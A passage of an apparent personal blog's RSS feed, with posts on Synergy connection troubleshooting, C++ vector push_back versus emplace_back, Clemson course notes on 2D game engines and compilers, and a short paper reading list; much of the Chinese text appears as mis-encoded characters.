&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-10-27-Application-Synergy/2018-10-27-00-22-46.png" alt="">&lt;/p>
&lt;p>ç¶åæå¼å®¢æç«¯ï¼å¨éé¢è¾å¥æå¡å¨çIPå°åå°±å¯ä»¥è¿æ¥äºã&lt;/p>
&lt;h1 id="issue">Issue&lt;/h1>
&lt;h2 id="è¿æ¥è¢«æç»refuedé®é¢">è¿æ¥è¢«æç»refuedé®é¢&lt;/h2>
&lt;p>è¿ééè¦ä¿è¯ä¸¤è¾¹çè¿æ¥éç½®æ¯ä¸è´çï¼å¨è¿éæç»åºæçéç½®æ¹å¼ï¼ä¸éè¦ä½¿ç¨å å¯çæ¹å¼ï¼å¦æä½¿ç¨å å¯çè¯ï¼éè¦ä¿è¯ä¸¤ç«¯å å¯çç§é¥æ¯ä¸è´çã&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-10-27-Application-Synergy/2018-10-27-00-26-43.png" alt="">&lt;/p>
&lt;h2 id="è¿æ¥è¶æ¶çé®é¢time-out">è¿æ¥è¶æ¶çé®é¢ï¼Time out&lt;/h2>
&lt;p>&lt;strong>è¿ä¸ªé®é¢æä¸¤ç§æåµï¼&lt;/strong>&lt;/p>
&lt;p>ç¬¬ä¸ç§æåµï¼è¾åºäºéè¯¯çæå¡å¨IPå°åï¼æå¡å¨çIPå°åä¸å®è¦èªå·±æ¥çç½ç»ééå¨å¾å°çæ­£çIPå°åï¼ä¸è¦ä½¿ç¨è¿ä¸ªè½¯ä»¶éç½®çæ¶åæ¨èçIPå°åï¼å®ççå¾æå¯è½æ¯éè¯¯çã&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-10-27-Application-Synergy/2018-10-27-00-28-49.png" alt="">&lt;/p>
&lt;p>æ¯å¦æä½¿ç¨çè¿ä¸æ¬¡ï¼å°±ä¼åºç°IPå°åå®å¨åå®æ¨èçä¸ä¸æ ·çæåµãè¿ç§æåµæä¹å¯ä»¥è¿æ¥ä¸çå¢&lt;/p>
&lt;p>ç¬¬äºç§æåµï¼Windowséé¢ç&lt;code>synergy&lt;/code>æå¡è¢«å³é­äºï¼å¨æå¡çéé¡¹éé¢å»æå¼å°±å¥½äºã&lt;/p>
&lt;h2 id="çæ¬é®é¢">çæ¬é®é¢&lt;/h2>
&lt;p>å°½éåæ¶å¨å®¢æ·ç«¯åæå¡å¨ç«¯ä½¿ç¨ç¸åççæ¬ï¼ä¿è¯æå°éåº¦çåºç°é®é¢&lt;/p>
&lt;h2 id="errorunrecognised-client-name-xxxxx">errorï¼unrecognised client name XXXXX&lt;/h2>
&lt;p>screen name æ¯è½¯ä»¶è§å®çï¼ä¸è½èªå·±çåãå¨æ¯ä¸ªå®¢æ·ç«¯/æå¡å¨ä¸è½æ¥å°ï¼ä¹å¯ä»¥éè¿edit-&amp;gt;settingä¿®æ¹&lt;/p>
&lt;h2 id="error-failed-to-init-synwinhkdll">ERROR: failed to init synwinhk.dll&lt;/h2>
&lt;p>å³é­synergyï¼ä»ç³»ç»è¿ç¨éå³é­synergyçè¿ç¨ï¼åéæ°å¯å¨å³å¯ã&lt;/p></description></item><item><title>C++ vector push_back() Vs emplace_back</title><link>http://www.guozet.me/post/C++-Vector-pushback-vs-emplaceback/</link><pubDate>Tue, 23 Oct 2018 02:09:31 +0000</pubDate><guid>http://www.guozet.me/post/C++-Vector-pushback-vs-emplaceback/</guid><description>&lt;h1 id="introduce">Introduce&lt;/h1>
&lt;h2 id="stdvectorpush_back">std::vector::push_back()&lt;/h2>
&lt;p>Appends the given element value to the end of the container.&lt;/p>
&lt;ul>
&lt;li>The new element is initialized as a copy of value.&lt;/li>
&lt;li>value is moved into the new element.&lt;/li>
&lt;/ul>
&lt;p>If the new &lt;code>size()&lt;/code> is greater than &lt;code>capacity()&lt;/code> then all iterators and references (including the past-the-end iterator) are invalidated. Otherwise only the past-the-end iterator is invalidated. (Cite from:
&lt;a href="https://en.cppreference.com/w/cpp/container/vector/push_back" target="_blank" rel="noopener">cppreference.com&lt;/a>)&lt;/p>
&lt;hr>
&lt;h3 id="example">Example&lt;/h3>
&lt;p>Firstly, if we have a class &lt;code>String&lt;/code>, then we can use this class to test the &lt;code>push_back()&lt;/code> functions.&lt;/p>
&lt;pre>&lt;code class="language-cpp">#include &amp;lt;iostream&amp;gt;
#include &amp;lt;cstring&amp;gt;
#include &amp;lt;vector&amp;gt;
class string {
public:
string() : buf(new char[1]) {
std::cout &amp;lt;&amp;lt; &amp;quot;default&amp;quot; &amp;lt;&amp;lt; std::endl;
buf[0] = '\0';
}
string(const char* s) : buf(new char[strlen(s) + 1]) {
std::cout &amp;lt;&amp;lt; &amp;quot;convert&amp;quot; &amp;lt;&amp;lt; std::endl;
strcpy(buf, s);
}
explicit string(const string&amp;amp; s) : buf(new char[strlen(s.buf) + 1]) {
std::cout &amp;lt;&amp;lt; &amp;quot;copy&amp;quot; &amp;lt;&amp;lt; std::endl;
strcpy(buf, s.buf);
}
~string() {
std::cout &amp;lt;&amp;lt; &amp;quot;destructor&amp;quot; &amp;lt;&amp;lt; std::endl;
delete[] buf;
}
string&amp;amp; operator=(const string&amp;amp; rhs) {
std::cout &amp;lt;&amp;lt; &amp;quot;copy assign&amp;quot; &amp;lt;&amp;lt; std::endl;
if (this == &amp;amp;rhs) return *this;
delete[] buf;
buf = new char[strlen(rhs.buf) + 1];
strcpy(buf, rhs.buf);
return *this;
}
const char* getBuf() const { return buf; }
private:
char* buf;
};
std::ostream&amp;amp; operator&amp;lt;&amp;lt;(std::ostream&amp;amp; out, const string&amp;amp; s) {
return out &amp;lt;&amp;lt; s.getBuf();
}
&lt;/code>&lt;/pre>
&lt;p>&lt;strong>Understand:&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>The new element is initialized as a copy of value.&lt;/li>
&lt;li>value is moved into the new element.&lt;/li>
&lt;/ul>
&lt;pre>&lt;code class="language-cpp">int main() {
std::vector&amp;lt;string&amp;gt; vec;
vec.push_back(&amp;quot;test&amp;quot;);
vec.push_back(&amp;quot;test2&amp;quot;);
}
&lt;/code>&lt;/pre>
&lt;p>Output:&lt;/p>
&lt;pre>&lt;code class="language-bash">convert // Covert &amp;quot;test&amp;quot; to class string
copy // Copy string(test) to vector
destructor
convert // Covert &amp;quot;test2&amp;quot; to class string
copy // Size() &amp;gt; capacity(), then apply for a new memory, and copy &amp;quot;test&amp;quot; to new vector.
copy // Copy string(test2) to vector
destructor
destructor
destructor
destructor
&lt;/code>&lt;/pre>
&lt;p>In the case, I used this example to test how to initialize a new element in the vector. Like this case, when we new an object, we copy this object into vector. After that, we can delete this object.&lt;/p>
&lt;ul>
&lt;li>Convert a new string object 1&lt;/li>
&lt;li>Copy the string object 1 to the string object 2, and move string object 2 into the new element.&lt;/li>
&lt;li>Delete the string object 1&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h2 id="stdvectoremplace_back-since-c-11">std::vector::emplace_back (Since C++ 11)&lt;/h2>
&lt;p>Appends a new element to the end of the container. The element is constructed through std::allocator_traits::construct, which typically uses placement-new to construct the element in-place at the location provided by the container. The arguments args&amp;hellip; are forwarded to the constructor as std::forward&lt;Args>(args)&amp;hellip;.&lt;/p>
&lt;p>If the new size() is greater than capacity() then all iterators and references (including the past-the-end iterator) are invalidated. Otherwise only the past-the-end iterator is invalidated.&lt;/p>
&lt;h3 id="example-1">Example&lt;/h3>
&lt;pre>&lt;code class="language-cpp">int main() {
std::vector&amp;lt;string&amp;gt; vec;
vec.emplace_back(&amp;quot;TEST&amp;quot;);
vec.emplace_back(&amp;quot;TES3&amp;quot;);
}
&lt;/code>&lt;/pre>
&lt;p>&lt;strong>Output:&lt;/strong>&lt;/p>
&lt;pre>&lt;code class="language-bash">convert
convert
copy // Copy the first one from the old vector memory to the new memory
destructor
destructor
destructor
&lt;/code>&lt;/pre></description></item><item><title>2-D Game Engine Construction (CU CPSC6160)</title><link>http://www.guozet.me/post/2D-Game-Engine-Construction/</link><pubDate>Fri, 05 Oct 2018 13:04:27 +0000</pubDate><guid>http://www.guozet.me/post/2D-Game-Engine-Construction/</guid><description>&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-10-04-2D-Game-Engine-Construction/2018-10-07-20-02-19.png" alt="">&lt;/p>
&lt;p>2Dæ¸¸æå¼æè®¾è®¡è¿é¨è¯¾ç¨æ¯æå¨CUç2018 Falléä¿®çä¸é¨ä¸ä¸æ ¸å¿è¯¾ç¨ï¼èå¸æ¯Clemson CSç³»æ¯è¾åæ¬¢è¿ç
&lt;a href="https://people.cs.clemson.edu/~malloy/" target="_blank" rel="noopener">Brian Malloyææ&lt;/a>ã&lt;/p>
&lt;hr>
&lt;h1 id="è¯¾ç¨åå®¹">è¯¾ç¨åå®¹&lt;/h1>
&lt;h3 id="week1">Week1&lt;/h3>
&lt;p>&lt;strong>Aug 28, Tue:&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>Office hour: Wed 10-11:30 AM&lt;/li>
&lt;li>Quiz on Tue or Thu&lt;/li>
&lt;li>Answer Ques about Basics or Classes:
&lt;ul>
&lt;li>ternery operator&lt;/li>
&lt;li>namespaces&lt;/li>
&lt;li>if (0)&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Do the Rule of 3&lt;/li>
&lt;/ul>
&lt;p>æ¬å¨çéç¹åå®¹æ¯&lt;code>C++çåºæ¬è¯­æ³ä»¥åClassesçä½¿ç¨&lt;/code> å &lt;code>C++ Rule of 3&lt;/code>çè§ååºç¨ãå¨è¿éåå«æ´çäºä¸¤ä¸ªé¨åçåå®¢æç« ï¼&lt;/p>
&lt;ul>
&lt;li>
&lt;a href="http://www.guozet.me/post/C&amp;#43;&amp;#43;-Rule-Of-Three/">C++ Rule of 3&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>Aug 30, Thu:&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>refs vs ptrs&lt;/li>
&lt;li>r-value references&lt;/li>
&lt;li>Introduce SDL draw functions&lt;/li>
&lt;li>Review Rule of 3 &amp;ndash; how to reproduce no crash?&lt;/li>
&lt;li>Illustrate the functions that are called: whatcalls&lt;/li>
&lt;li>Trace the Rule of 3 example from cppreference&lt;/li>
&lt;li>Rule of 0&lt;/li>
&lt;li>Introduce vectors:
&lt;ul>
&lt;li>size vs capacity&lt;/li>
&lt;li>push_back vs emplace_back&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="week2">Week2&lt;/h3>
&lt;p>&lt;strong>Sep 4, Tue&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>Review what get&amp;rsquo;s called:
&lt;ul>
&lt;li>why prefer init vs assign&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Introduce vectors:
&lt;ul>
&lt;li>size vs capacity&lt;/li>
&lt;li>value semantics&lt;/li>
&lt;li>emplace_back&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Marcus Painting&lt;/li>
&lt;li>Project #2&lt;/li>
&lt;li>Quiz #1 review&lt;/li>
&lt;/ul>
&lt;h2 id="week3">Week3&lt;/h2>
&lt;p>&lt;strong>Sep 11, Tue:&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>Review the quiz&lt;/li>
&lt;li>Why no vector.push_front() ???&lt;/li>
&lt;li>When to use emplace_back()?&lt;/li>
&lt;li>A temp is always an r-value reference&lt;/li>
&lt;li>review Rule of 3, Rule of 0, Rule of 5&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>Sep 13, Thu:&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>Your game: can definitely be a &amp;ldquo;cover&amp;rdquo;
&lt;ul>
&lt;li>Keep the scope manageable &amp;ndash; one level, etc.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Terminology:
&lt;ul>
&lt;li>move assignment vs copy assignment&lt;/li>
&lt;li>copy constructor vs move constructor&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Questions about move semantics&lt;/li>
&lt;li>ranged for loops:
&lt;ul>
&lt;li>ints: size vs cap&lt;/li>
&lt;li>C++ strings&lt;/li>
&lt;li>why no push_front for vector?&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Drawing a texture: GPU
&lt;ul>
&lt;li>Makefile&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Drawing a Surface: CPU&lt;/li>
&lt;/ul>
&lt;h3 id="week4">Week4&lt;/h3>
&lt;p>&lt;strong>Sep 18, Tue:&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>static variables&lt;/li>
&lt;li>Design Patterns&lt;/li>
&lt;li>The Singleton Design Pattern&lt;/li>
&lt;li>Animations with SDL:
&lt;ul>
&lt;li>cpu clock vs game clock&lt;/li>
&lt;li>Why clear the screen&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Inheritance:&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>Sep 20, Thu:&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>Sammy&amp;rsquo;s dilemma&lt;/li>
&lt;li>Project #2 &amp;ndash; let&amp;rsquo;s look at my solution.&lt;/li>
&lt;li>The Meyer&amp;rsquo;s Singleton&lt;/li>
&lt;li>Polymorphism:
&lt;ul>
&lt;li>see poly example&lt;/li>
&lt;li>shapes example&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Use g++ not clang++ for effc++ warnings&lt;/li>
&lt;li>Project #3 and the tracker framework
&lt;ul>
&lt;li>default vs delete for constructors/destructors&lt;/li>
&lt;li>ranged for vs while&lt;/li>
&lt;li>when to use auto&lt;/li>
&lt;li>function overload&lt;/li>
&lt;li>transparency vs alpha channel&lt;/li>
&lt;li>Parallax Scrolling&lt;/li>
&lt;li>Getting images vs &amp;ldquo;rolling your own&amp;rdquo;&lt;/li>
&lt;li>Making videos&lt;/li>
&lt;li>why use g++ vs clang++&lt;/li>
&lt;li>XML&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>çè§£ä¸ºä»ä¹è¦ä½¿ç¨ Singletonè®¾è®¡æ¨¡å¼ï¼å·²è¯¦ç»åæäºä¸ºä»ä¹è¦ä½¿ç¨singletonæ¨¡å¼ï¼ä»¥åSingletonè®¾è®¡æ¨¡å¼çå¥½å¤åå¦ä½æ¥ä¹¦åSingleton. è¯·åèåå®¢:&lt;/p>
&lt;ul>
&lt;li>
&lt;a href="http://www.guozet.me/post/C&amp;#43;&amp;#43;Singleton-pattern/">C++è½¯ä»¶è®¾è®¡æ¨¡å¼ä¹Singleton&lt;/a> åå«äºä¸¤ç§Singletonçä¹¦åæ¹å¼&lt;/li>
&lt;/ul>
&lt;h2 id="week-5">Week 5&lt;/h2>
&lt;p>&lt;strong>Sep 25, Tue:&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>Last time: Many spinning stars &amp;ndash; tweak velocity using XML velocity as base!&lt;/li>
&lt;li>Parallax Scrolling is easy &amp;ndash; it&amp;rsquo;s already in the code&lt;/li>
&lt;li>string streams&lt;/li>
&lt;li>making a video&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>Sep 27, Thu:&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>Quiz #2&lt;/li>
&lt;/ul>
&lt;h2 id="week-6">Week 6&lt;/h2>
&lt;p>&lt;strong>Oct 2, Tue:&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>maps&lt;/li>
&lt;li>sorting:
&lt;ul>
&lt;li>vectors&lt;/li>
&lt;li>lists&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>emplace_back: how to use?&lt;/li>
&lt;li>Why Singleton:
&lt;ul>
&lt;li>Gamedata?&lt;/li>
&lt;li>Clock?&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Two-way sprites?&lt;/li>
&lt;li>SpriteSheet&lt;/li>
&lt;li>Project #2 &amp;ndash; CANDY&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>Oct 4, Thu:&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>Jacob Wood&lt;/li>
&lt;li>IoMod: overload writeText
&lt;ul>
&lt;li>put in Engine::draw, which is const!&lt;/li>
&lt;li>Engine::update is NOT const!&lt;/li>
&lt;li>draw and update called every iteration of the event list&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Why Singleton:
&lt;ul>
&lt;li>Gamedata &amp;ndash; yes&lt;/li>
&lt;li>Clock &amp;ndash; no!&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Clock and fps&lt;/li>
&lt;li>string streams&lt;/li>
&lt;li>Two-way sprites?&lt;/li>
&lt;li>SpriteSheet&lt;/li>
&lt;li>projects from last year&lt;/li>
&lt;li>project #4&lt;/li>
&lt;li>sorting:
&lt;ul>
&lt;li>vectors&lt;/li>
&lt;li>lists&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="week-7">Week 7&lt;/h2>
&lt;p>&lt;strong>Oct 9, Thu&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>Why Singleton:
&lt;ul>
&lt;li>Gamedata &amp;ndash; yes&lt;/li>
&lt;li>Clock &amp;ndash; no!&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Clock and fps&lt;/li>
&lt;li>string streams&lt;/li>
&lt;li>Two-way sprites?&lt;/li>
&lt;li>SpriteSheet&lt;/li>
&lt;li>A Player Class&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>Oct 11, Thu:&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>
&lt;p>Does anyone get a black screen on startup?&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Good rule to follow: pre-load assets! e.g.: collision strategies.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Reminder: Exam #1 in one week!&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Modifications to ImageFactory and/or SpriteSheet???&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Review:&lt;/p>
&lt;ul>
&lt;li>How to make video for #3&lt;/li>
&lt;li>Adding a Player for #4
&lt;ul>
&lt;li>slide or no slide?&lt;/li>
&lt;li>how to fit player into tracker framework&lt;/li>
&lt;li>to cast or not to cast, that is the question.&lt;/li>
&lt;li>Where to put stuff in Engine.cpp&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>Nested Classes: the Clock class&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Collisions&lt;/p>
&lt;/li>
&lt;li>
&lt;p>AI:&lt;/p>
&lt;ul>
&lt;li>observer pattern&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="week-8">Week 8&lt;/h2>
&lt;p>&lt;strong>Oct 16, Tue:&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>Erasing from a list. Vector. map&lt;/li>
&lt;li>Project #4&lt;/li>
&lt;li>Exam #1&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>Oct 18, Thu:&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>Review Observer&lt;/li>
&lt;li>Quiz #2&lt;/li>
&lt;li>Sorting vectors and lists&lt;/li>
&lt;/ul>
&lt;h2 id="week-9">Week 9&lt;/h2>
&lt;p>&lt;strong>Oct 25, Thu:&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>github repo&lt;/li>
&lt;li>player/composition ==&amp;gt; it&amp;rsquo;s composition so need player.getVelocity()&lt;/li>
&lt;li>drawable.h in tracker framework didn&amp;rsquo;t have method getSurface&lt;/li>
&lt;li>input/mouse2
&lt;ul>
&lt;li>to get pixel color see getPixel&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="week-10">Week 10&lt;/h2>
&lt;p>&lt;strong>Nov 1, Thu:&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>Write a fn object&lt;/li>
&lt;li>Review lamda functions&lt;/li>
&lt;li>Show lamda in sort&lt;/li>
&lt;li>Review Explosions&lt;/li>
&lt;li>Health bar (in your repo)
&lt;ul>
&lt;li>A model for your HUD!&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="week-11">Week 11&lt;/h2>
&lt;p>&lt;strong>Nov 8, Tue:&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>Review fn objects and lambda functions&lt;/li>
&lt;li>Review the two classes needed for Chunk explosions&lt;/li>
&lt;li>Review Object pool&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>Quiz 3&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>Sort
&lt;ul>
&lt;li>Funciton object&lt;/li>
&lt;li>lambda Funciton&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Search in a list, vector, map&lt;/li>
&lt;li>Erasing from a list. Vector, map&lt;/li>
&lt;li>observer pattern&lt;/li>
&lt;li>static_cast Vs dynamic_cast&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h1 id="èªå·±å¨æåæ¸¸æå¼æ">èªå·±å¨æåæ¸¸æå¼æ&lt;/h1>
&lt;!--TODO:å®æä¸é¢æ¯ä¸ä¸ªè¢«é¨åçåå®¢æç«  -->
&lt;ul>
&lt;li>æ¦è¿°&lt;/li>
&lt;li>è®¾è®¡ä½¿ç¨C++ç»åºæ¥å¾å½¢&lt;/li>
&lt;li>åä¸ä¸ªObjectç§»å¨çæ¨¡å¼&lt;/li>
&lt;/ul></description></item><item><title>Paper Reading list</title><link>http://www.guozet.me/post/All-Paper-Which-I-Read/</link><pubDate>Fri, 05 Oct 2018 13:04:27 +0000</pubDate><guid>http://www.guozet.me/post/All-Paper-Which-I-Read/</guid><description>&lt;h2 id="network-relation">Network relation&lt;/h2>
&lt;ul>
&lt;li>Kitsune: An Ensemble of Autoencoders for Online Network Intrusion Detection [
&lt;a href="https://arxiv.org/pdf/1802.09089.pdf" target="_blank" rel="noopener">PDF&lt;/a>] [
&lt;a href="http://wp.internetsociety.org/ndss/wp-content/uploads/sites/25/2018/03/NDSS2018_03A-3_Mirsky_Slides.pdf" target="_blank" rel="noopener">Slide&lt;/a>] [
&lt;a href="https://www.youtube.com/watch?v=QehnPHi04gM&amp;amp;t=0s&amp;amp;list=PLfFKnJD0vki8Xjo5Gsb67nPKwOIkLqTvN&amp;amp;index=2" target="_blank" rel="noopener">Video&lt;/a>]&lt;/li>
&lt;/ul>
&lt;h2 id="cloud-computing">Cloud Computing&lt;/h2></description></item><item><title>Translation of Programming Languages(CU CPSC8270)</title><link>http://www.guozet.me/post/Translation-of-Programming-Languages-index/</link><pubDate>Fri, 05 Oct 2018 13:04:27 +0000</pubDate><guid>http://www.guozet.me/post/Translation-of-Programming-Languages-index/</guid><description>&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-10-04-Translation-of-Programming-Languages-index/2018-10-07-18-16-06.png" alt="">&lt;/p>
&lt;p>ç¼è¯åçè¿é¨è¯¾ç¨æ¯æå¨CUç2018 Falléä¿®çä¸é¨ä¸ä¸æ ¸å¿è¯¾ç¨ï¼èå¸æ¯Clemson CSç³»æ¯è¾åæ¬¢è¿ç
&lt;a href="https://people.cs.clemson.edu/~malloy/" target="_blank" rel="noopener">Brian Malloyææ&lt;/a>ãå¨ä»çä¸ªäººä¸»é¡µä¸é¢ä¹æPython, C++ï¼ 2Dæ¸¸æçæç¨ï¼éå¸¸éåå¯¹CSæå´è¶£çåå­¦å­¦ä¹ ã&lt;/p>
&lt;hr>
&lt;h1 id="è¯¾ç¨åå®¹">è¯¾ç¨åå®¹&lt;/h1>
&lt;h3 id="week1">Week1&lt;/h3>
&lt;p>&lt;strong>Aug 28, Tue&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>Read Section 1, the Introduction, to grammarware paper&lt;/li>
&lt;li>Discuss slides about Grammars&lt;/li>
&lt;li>Answer questions about Basics and Classes&lt;/li>
&lt;li>Do the Rule of 3&lt;/li>
&lt;/ul>
&lt;p>æ¬å¨çéç¹åå®¹æ¯&lt;code>C++çåºæ¬è¯­æ³ä»¥åClassesçä½¿ç¨&lt;/code> å &lt;code>C++ Rule of 3&lt;/code>çè§ååºç¨ãå¨è¿éåå«æ´çäºä¸¤ä¸ªé¨åçåå®¢æç« ï¼&lt;/p>
&lt;ul>
&lt;li>
&lt;a href="http://www.guozet.me/post/C&amp;#43;&amp;#43;-Rule-Of-Three/">C++ Rule of 3&lt;/a>&lt;/li>
&lt;/ul>
&lt;!-- TODO:å®æå³äºBasics and Classesçåå®¹ -->
&lt;p>&lt;strong>Aug 30, Thu&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>Regular grammars and regular expressions&lt;/li>
&lt;li>Review Rule of 3&lt;/li>
&lt;li>What gets called&lt;/li>
&lt;li>The Rule of 5&lt;/li>
&lt;li>The Rule of Zero&lt;/li>
&lt;/ul>
&lt;!-- TODO:Post: Rule of 5
TODO:Post: Rule of Zero
TODO:Post: what get called.
TODO:Regular expressions -->
&lt;h2 id="week2">Week2&lt;/h2>
&lt;p>&lt;strong>Sep 4, Tue&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>What gets called
&lt;ul>
&lt;li>Why prefer init over assign?!&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Introduce vectors
&lt;ul>
&lt;li>size vs capacity&lt;/li>
&lt;li>value semantics&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Intro to Flex&lt;/li>
&lt;li>Project #2&lt;/li>
&lt;li>Quiz #1 &amp;ndash; Thursday&lt;/li>
&lt;/ul>
&lt;h2 id="week3">Week3&lt;/h2>
&lt;p>&lt;strong>Sep 13, Thu&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>Questions about move semantics?
&lt;ul>
&lt;li>Well I have one?&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>flex:
&lt;ul>
&lt;li>ambiguity:&lt;/li>
&lt;li>codes&lt;/li>
&lt;li>first&lt;/li>
&lt;li>wc&lt;/li>
&lt;li>states&lt;/li>
&lt;li>line numbers: lineno&lt;/li>
&lt;li>debug mode&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>static varsux&lt;/li>
&lt;li>Singleton Pattern (åä¾è®¾è®¡æ¨¡å¼)&lt;/li>
&lt;/ul>
&lt;p>çè§£ä¸ºä»ä¹è¦ä½¿ç¨ Singletonè®¾è®¡æ¨¡å¼ï¼å·²è¯¦ç»åæäºä¸ºä»ä¹è¦ä½¿ç¨singletonæ¨¡å¼ï¼ä»¥åSingletonè®¾è®¡æ¨¡å¼çå¥½å¤åå¦ä½æ¥ä¹¦åSingleton. è¯·åèåå®¢:&lt;/p>
&lt;ul>
&lt;li>
&lt;a href="http://www.guozet.me/post/C&amp;#43;&amp;#43;Singleton-pattern/">C++è½¯ä»¶è®¾è®¡æ¨¡å¼ä¹Singleton&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="week4">Week4&lt;/h2>
&lt;p>&lt;strong>Sep 20, Thu&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>The Bison Parser Generator: shift/reduce parsing LALR(1)&lt;/li>
&lt;li>Balanced Parens &amp;ndash; adding sets of them&lt;/li>
&lt;li>sum &amp;ndash; adding numbers&lt;/li>
&lt;/ul>
&lt;h2 id="week-5">Week 5&lt;/h2>
&lt;p>&lt;strong>Sep 25, Tue&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>conflicts &amp;ndash; the pointer model
&lt;ul>
&lt;li>Inserting semantic actions:&lt;/li>
&lt;li>simple &amp;ndash; no actions but prec set&lt;/li>
&lt;li>noPrec &amp;ndash; grammar refactored, no prec set&lt;/li>
&lt;li>calc &amp;ndash; calculator example &amp;ndash; no variables&lt;/li>
&lt;li>typedStack &amp;ndash; calculator w/ variables&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Project #3&lt;/li>
&lt;li>Exam #1 &amp;ndash; everything up to and incl today&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>Sep 27. Thu&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>Exam #1 &amp;ndash; everything up to and incl today&lt;/li>
&lt;/ul>
&lt;h2 id="week-6">Week 6&lt;/h2>
&lt;p>&lt;strong>Oct 2. Tue&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>Containers
&lt;ul>
&lt;li>vectors&lt;/li>
&lt;li>List&lt;/li>
&lt;li>Map&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Review Exam
&lt;ul>
&lt;li>Singleton&lt;/li>
&lt;li>Exponent&lt;/li>
&lt;li>Radon&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Inheritance&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>Oct 4. Thu&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>emplace_back &amp;ndash; When it help?&lt;/li>
&lt;/ul>
&lt;h1 id="é¡¹ç®åå®¹">é¡¹ç®åå®¹&lt;/h1>
&lt;h2 id="é¡¹ç®">é¡¹ç®&lt;/h2>
&lt;hr>
&lt;h1 id="èªå·±å¨æåpythonç¼è¯å¨">èªå·±å¨æåPythonç¼è¯å¨&lt;/h1>
&lt;!--TODO:å®æä¸é¢æ¯ä¸ä¸ªè¢«é¨åçåå®¢æç«  -->
&lt;ul>
&lt;li>æ¦è¿°&lt;/li>
&lt;li>Python æºç¨åº&lt;/li>
&lt;li>ä½¿ç¨flexåè¯æ³åæ&lt;/li>
&lt;li>ä¸ä¸ææ å³è¯­æ³ååæ&lt;/li>
&lt;li>èªé¡¶åä¸åæ&lt;/li>
&lt;li>èªåºåä¸åæ&lt;/li>
&lt;li>ä½¿ç¨Bisonåè¯­æ³åæ&lt;/li>
&lt;li>Pythonç¼è¯å¨&lt;/li>
